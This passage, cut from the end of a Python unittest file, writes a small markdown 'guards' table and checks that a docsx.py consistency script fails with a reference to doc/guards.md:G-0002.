            "# guards\n\n| id | bugs | type | paths | check | note |\n"
            "| --- | --- | --- | --- | --- | --- |\n"
            "| G-0002 | BUG-0002 | checklist | tb/foo.sv | - | n |\n",
            encoding="utf-8")
        cp = run(self.tmp, "docsx.py", "--check")
        self.assertEqual(cp.returncode, 1)
        self.assertIn("doc/guards.md:G-0002", cp.stdout)


if __name__ == "__main__":
    unittest.main()
